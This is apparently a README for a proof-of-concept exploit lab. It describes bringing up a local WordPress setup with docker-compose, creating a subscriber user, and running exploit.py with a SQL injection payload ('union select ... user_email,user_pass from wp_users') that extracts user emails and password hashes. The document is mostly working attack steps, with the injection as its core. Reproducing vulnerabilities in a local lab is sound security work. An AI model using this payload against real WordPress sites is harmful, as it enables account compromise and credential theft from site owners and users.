# How to use
* Start mysql, wordpress and wordpress-cli using docker-compose
```
docker-compose -f docker-compose.yaml up -d
```
* Install wordpress, activate the plugin and create a user with the role subscriber using wordpress-cli
```
docker-compose run --rm wp-cli install-wp
```
* Start the exploit script with an sql query that gets users emails and passwords
```
python3 exploit.py -C 'union select 1,1,user_email,user_pass from wp_users -- '
```